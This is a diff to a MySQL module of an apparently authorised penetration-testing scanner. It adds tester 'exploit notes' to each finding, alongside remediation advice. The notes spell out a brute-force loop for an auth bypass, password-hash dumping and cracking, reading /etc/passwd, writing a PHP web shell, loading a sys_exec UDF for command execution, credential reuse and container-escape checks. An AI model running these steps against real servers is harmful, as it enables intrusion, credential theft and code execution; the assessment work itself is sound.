@@ -496,8 +496,10 @@ def mysql_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
-    return _base_finding("mysql", sev, title, target, detail, cmd, rem, cwes, kind)
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
+    return _base_finding("mysql", sev, title, target, detail, cmd, rem, cwes, kind,
+                         exploit_note=exploit_note, depth_tier=depth_tier)
 
 
 # UDF names universally packaged with lib_mysqludf_sys (raptor's) — presence of
@@ -508,42 +510,68 @@ _UDF_RCE_NAMES = frozenset({"sys_exec", "sys_eval", "sys_get", "sys_set",
 
 
 # Version → CVE map. Each entry: (flavor, (major, minor, patch)-INCLUSIVE ceiling,
-# CVE id, severity, blurb). A server at or BELOW the ceiling (same flavor) trips
-# the finding. Airgap-safe — no external CVE lookup, drawn from Oracle Critical
-# Patch Updates + MariaDB advisories. Kept intentionally short and high-confidence.
-_MYSQL_CVE_MAP: list[tuple[str, tuple[int, int, int], str, str, str]] = [
+# CVE id, severity, blurb, exploit_note, depth_tier). A server at or BELOW the
+# ceiling (same flavor) trips the finding. Airgap-safe — no external CVE lookup,
+# drawn from Oracle Critical Patch Updates + MariaDB advisories. Kept intentionally
+# short and high-confidence. The last two columns thread the tester-facing
+# next-move + depth tier through into the emitted Vuln.
+_MYSQL_CVE_MAP: list[tuple[str, tuple[int, int, int], str, str, str, str, str]] = [
     # CVE-2012-2122 — memcmp auth-bypass (glibc-dependent). MySQL <5.1.62 / <5.5.23
     # / <5.6.6; MariaDB shared the fork so ceilings match the era.
     ("mysql", (5, 1, 61), "CVE-2012-2122", "critical",
      "memcmp() auth-bypass — one-in-256 chance any wrong password logs in as any "
-     "user on a vulnerable glibc build. Fixed in 5.1.62 / 5.5.23 / 5.6.6."),
+     "user on a vulnerable glibc build. Fixed in 5.1.62 / 5.5.23 / 5.6.6.",
+     "for i in $(seq 1 500); do mysql -u root -h <ip> --password=WRONG -e 'SELECT 1' "
+     "2>/dev/null && echo HIT && break; done. If HIT, dump mysql.user hashes.",
+     "t0"),
     ("mysql", (5, 5, 22), "CVE-2012-2122", "critical",
      "memcmp() auth-bypass — one-in-256 chance any wrong password logs in as any "
-     "user on a vulnerable glibc build. Fixed in 5.5.23."),
+     "user on a vulnerable glibc build. Fixed in 5.5.23.",
+     "for i in $(seq 1 500); do mysql -u root -h <ip> --password=WRONG -e 'SELECT 1' "
+     "2>/dev/null && echo HIT && break; done. If HIT, dump mysql.user hashes.",
+     "t0"),
     ("mysql", (5, 6, 5), "CVE-2012-2122", "critical",
      "memcmp() auth-bypass — one-in-256 chance any wrong password logs in as any "
-     "user on a vulnerable glibc build. Fixed in 5.6.6."),
+     "user on a vulnerable glibc build. Fixed in 5.6.6.",
+     "for i in $(seq 1 500); do mysql -u root -h <ip> --password=WRONG -e 'SELECT 1' "
+     "2>/dev/null && echo HIT && break; done. If HIT, dump mysql.user hashes.",
+     "t0"),
     ("mariadb", (5, 5, 22), "CVE-2012-2122", "critical",
      "memcmp() auth-bypass in MariaDB fork of MySQL — one-in-256 chance any wrong "
-     "password logs in as any user on a vulnerable glibc build. Fixed in 5.5.23."),
+     "password logs in as any user on a vulnerable glibc build. Fixed in 5.5.23.",
+     "for i in $(seq 1 500); do mysql -u root -h <ip> --password=WRONG -e 'SELECT 1' "
+     "2>/dev/null && echo HIT && break; done. If HIT, dump mysql.user hashes.",
+     "t0"),
     # CVE-2016-6662 — mysqld_safe MALLOC_LIB privilege escalation to root via
     # log config file. Fixed in 5.5.52 / 5.6.33 / 5.7.15.
     ("mysql", (5, 5, 51), "CVE-2016-6662", "high",
      "mysqld_safe MALLOC_LIB race — a low-priv DB account with FILE and log-config "
-     "writes escalates to root. Fixed in 5.5.52."),
+     "writes escalates to root. Fixed in 5.5.52.",
+     "With FILE priv: SET GLOBAL general_log_file='/var/lib/mysql/my.cnf'; SET GLOBAL "
+     "general_log=1; INSERT trigger crafted [malloc_lib] block; check /proc for mysqld_safe.",
+     "t0"),
     ("mysql", (5, 6, 32), "CVE-2016-6662", "high",
      "mysqld_safe MALLOC_LIB race — a low-priv DB account with FILE and log-config "
-     "writes escalates to root. Fixed in 5.6.33."),
+     "writes escalates to root. Fixed in 5.6.33.",
+     "With FILE priv: SET GLOBAL general_log_file='/var/lib/mysql/my.cnf'; SET GLOBAL "
+     "general_log=1; INSERT trigger crafted [malloc_lib] block; check /proc for mysqld_safe.",
+     "t0"),
     ("mysql", (5, 7, 14), "CVE-2016-6662", "high",
      "mysqld_safe MALLOC_LIB race — a low-priv DB account with FILE and log-config "
-     "writes escalates to root. Fixed in 5.7.15."),
+     "writes escalates to root. Fixed in 5.7.15.",
+     "With FILE priv: SET GLOBAL general_log_file='/var/lib/mysql/my.cnf'; SET GLOBAL "
+     "general_log=1; INSERT trigger crafted [malloc_lib] block; check /proc for mysqld_safe.",
+     "t0"),
     # CVE-2021-2154 — partitioning DoS (post-auth). MySQL 5.7 <5.7.34, 8.0 <8.0.23.
+    # Medium — no exploit_note/depth_tier wired (deferred to a future audit pass).
     ("mysql", (5, 7, 33), "CVE-2021-2154", "medium",
      "Server: DML partitioning DoS — a post-auth attacker crashes the server. "
-     "Fixed in 5.7.34."),
+     "Fixed in 5.7.34.",
+     "", ""),
     ("mysql", (8, 0, 22), "CVE-2021-2154", "medium",
      "Server: DML partitioning DoS — a post-auth attacker crashes the server. "
-     "Fixed in 8.0.23."),
+     "Fixed in 8.0.23.",
+     "", ""),
 ]
 
 
@@ -578,7 +606,7 @@ def _cve_findings(tgt: str, ver_str: str) -> list[dict]:
     flavor, ver = parsed
     seen: set[str] = set()
     out: list[dict] = []
-    for cve_flavor, ceiling, cve, sev, blurb in _MYSQL_CVE_MAP:
+    for cve_flavor, ceiling, cve, sev, blurb, exploit_note, tier in _MYSQL_CVE_MAP:
         if cve_flavor != flavor:
             continue
         # Compare only within the same (major, minor) train — a 5.6 ceiling never
@@ -598,7 +626,8 @@ def _cve_findings(tgt: str, ver_str: str) -> list[dict]:
             f"vulnerable ceiling for {cve}. {blurb}",
             f"# banner-driven; verify against the vendor advisory for {cve}",
             f"Upgrade to a patched minor release addressing {cve}.",
-            ["CWE-1395"], kind=kind))
+            ["CWE-1395"], kind=kind,
+            exploit_note=exploit_note, depth_tier=tier))
     return out
 
 
@@ -638,7 +667,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"mysql -h {h.ip} -P {p.portid} -u {who or 'root'}",
                     "Set a strong password on every account (esp. root); remove anonymous "
                     "''@'%' accounts; bind to localhost / a private interface.",
-                    ["CWE-521", "CWE-306"], kind="mysql_empty_password"))
+                    ["CWE-521", "CWE-306"], kind="mysql_empty_password",
+                    exploit_note=(
+                        f"mysql -h {h.ip} -P {p.portid} -u root -e "
+                        "'SELECT user,host,authentication_string FROM mysql.user'; "
+                        "hashcat -m 300 hashes.txt rockyou.txt."),
+                    depth_tier="t2"))
             elif pr.get("cred_access"):
                 who = pr.get("cred_user", "?")
                 ver = pr.get("version") or ""
@@ -650,7 +684,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"mysql -h {h.ip} -P {p.portid} -u {who} -p",
                     "Rotate the credential; enforce least privilege; bind to a trusted "
                     "interface.",
-                    ["CWE-522", "CWE-284"], kind="mysql_cred_access"))
+                    ["CWE-522", "CWE-284"], kind="mysql_cred_access",
+                    exploit_note=(
+                        f"mysql -h {h.ip} -P {p.portid} -u {who} -p; then \\u mysql; "
+                        "SELECT * FROM user; check GRANTS for FILE/SUPER; if FILE, "
+                        "LOAD_FILE('/etc/passwd') and SELECT ... INTO OUTFILE "
+                        "'/var/www/html/s.php'."),
+                    depth_tier="t2"))
             lt = pr.get("loot") or {}
 
             # @@local_infile ON allows LOAD DATA LOCAL against consenting clients.
@@ -708,7 +748,15 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "\"SELECT LOAD_FILE('/etc/passwd')\"   # then INTO OUTFILE / UDF (ROE)",
                     "Revoke FILE from application accounts; set secure_file_priv to a "
                     "dedicated dir (or NULL); run mysqld as an unprivileged user.",
-                    ["CWE-732", "CWE-250"], kind="mysql_file_priv"))
+                    ["CWE-732", "CWE-250"], kind="mysql_file_priv",
+                    exploit_note=(
+                        f"mysql -h {h.ip} -P {p.portid} -u {who} -p -e "
+                        "\"SELECT LOAD_FILE('/etc/passwd')\"; if secure_file_priv "
+                        "empty + plugin_dir writable, wget lib_mysqludf_sys.so, "
+                        "SELECT ... INTO DUMPFILE '<plugin_dir>/l.so', "
+                        "CREATE FUNCTION sys_exec RETURNS INT SONAME 'l.so'; "
+                        "SELECT sys_exec('id')."),
+                    depth_tier="t1"))
             # Exfil: sensitive columns + redacted samples + harvested connection strings.
             dm = pr.get("datamine")
             if dm and dm.get("secret_columns"):
@@ -737,7 +785,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "\"SELECT * FROM <db>.<table> LIMIT 20\"   # full data (ROE)",
                     "Encrypt sensitive columns; least-privilege the app account; remove "
                     "embedded credentials; restrict network access.",
-                    ["CWE-200", "CWE-312"], kind="mysql_datamine"))
+                    ["CWE-200", "CWE-312"], kind="mysql_datamine",
+                    exploit_note=(
+                        f"mysql -h {h.ip} -P {p.portid} -u <u> -p -e "
+                        "'SELECT * FROM <db>.<table> LIMIT 20'; sanitize + reuse "
+                        "embedded creds against every discovered service."),
+                    depth_tier="t3"))
             # Loaded UDFs — mysql.func — that provide arbitrary command execution.
             # Presence of sys_exec / sys_eval / lib_mysqludf_sys is INSTANT RCE as
             # the mysql service account: no FILE priv, no writable plugin_dir needed.
@@ -762,7 +815,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "cmdshell, do_system); remove the shared library from plugin_dir; "
                     "revoke CREATE/DROP FUNCTION from application accounts; run "
                     "mysqld as an unprivileged, chrooted user.",
-                    ["CWE-250", "CWE-269"], kind="mysql_udf_loaded"))
+                    ["CWE-250", "CWE-269"], kind="mysql_udf_loaded",
+                    exploit_note=(
+                        f"mysql -h {h.ip} -P {p.portid} -u <u> -p -e "
+                        "\"SELECT sys_eval('id')\"; then whoami + hostname; "
+                        "check for docker / suid on the mysqld process for "
+                        "host escape."),
+                    depth_tier="t1"))
             elif udfs:
                 # Non-RCE UDFs still worth surfacing as a lower-severity inventory.
                 names = ", ".join((u.get("name") or "?") for u in udfs[:8])
